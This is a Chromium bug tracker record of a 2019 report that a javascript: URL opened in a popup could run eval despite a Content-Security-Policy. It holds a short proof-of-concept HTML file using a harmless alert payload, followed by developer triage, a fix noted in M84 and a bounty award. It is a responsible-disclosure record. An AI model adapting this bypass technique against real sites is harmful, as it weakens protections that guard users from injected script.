# Security: Bypass the CSP when popup with "javascript:"-URL 

| Field | Value |
|-------|-------|
| **Issue ID** | [40095955](https://issues.chromium.org/issues/40095955) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>SecurityFeature>ContentSecurityPolicy |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ti...@gmail.com |
| **Assignee** | mk...@chromium.org |
| **Created** | 2019-08-10 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

When set the CSP as <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'"> , the eval function will also work in `javascript:` URL.Just like the <https://crbug.com/chromium/582387>.

**VERSION**  

Chrome Version: [76.0.3809.100] + [stable]  

Operating System: [Windows10 1903]

**REPRODUCTION CASE**  

open the poc.html,the javascript:'<script>eval(`alert(233)`)</script>' will be executed in Chrom.  

FireFox/Microsoft Edge will both block the eval function.  

Chrome doesn't block the eval function.  

The POC.html:

```
<!DOCTYPE html>  
<html>  
<head>  
    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">  
</head>  
<body>  
    <script>  
  
        url1 = "javascript:eval(`alert(1)`)";  
        open(url1);  //Blocked by CSP  
        url2 = "javascript:'<script>eval(`alert(233)`)<\/script>'"  
        open(url2);  // Not blocked by CSP.  
      </script>  
</body>  
</html>  

```

## Timeline

### ke...@chromium.org (2019-08-12)

Thanks for the report.

andypaicu@: PTAL? This might end up a duplicate of https://crbug.com/chromium/990264 but I'm not certain, if there is a difference then it is subtle.

[Monorail components: Blink>SecurityFeature>ContentSecurityPolicy]

### ti...@gmail.com (2019-08-14)

These two issues are not the same thing.
This one is bypass CSP through "javascript:'<script>eval(`alert(233)`)<\/script>'" . The content in the evil function is the string. The key issue is that it do not inherit the parent CSP.
https://crbug.com/chromium/990264 is that the Chrome don't think eval(expression) should be blocked by the CSP.

### an...@chromium.org (2019-08-14)

Assigning to mkwst@ as I don't have cycles to take care of this. Also I'm not convinced that it's not a duplicate of 990264 it needs some more investigation in my opinion.

It seems that the CSP is inherited properly from the parent (based on the fact that the first opened window blocks the eval) but something about the logic of checking CSP for evals is probably flawed. Maybe the "script" tag inside the javascript url is what causes the flaw to be apparent.

Priority seems appropriate to me.

### mm...@google.com (2019-08-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### ar...@chromium.org (2020-04-20)

I know how CSP are inherited. In theory, this should work. See:
https://chromium-review.googlesource.com/c/chromium/src/+/2111170

I tried locally on 84.0.4115.5 (Official Build) dev (64-bit) and it was indeed working.
I observed:
- url1 is blocked in the opener document.
- url2 is blocked in the opened document.

Maybe this has been fixed by andypaicu@?

I will close this bug. Feel free to re-open if needed.

### na...@google.com (2020-04-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-21)

[Empty comment from Monorail migration]

### na...@google.com (2020-04-23)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-04-23)

Congrats the Panel decided to award $500 for this report!

### na...@google.com (2020-04-23)

[Empty comment from Monorail migration]

### ad...@google.com (2020-05-13)

The commit in https://crbug.com/chromium/992698#c9 was landed in M84.

### ad...@google.com (2020-05-13)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-07-13)

[Empty comment from Monorail migration]

### ad...@google.com (2020-07-22)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/992698?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095955)*
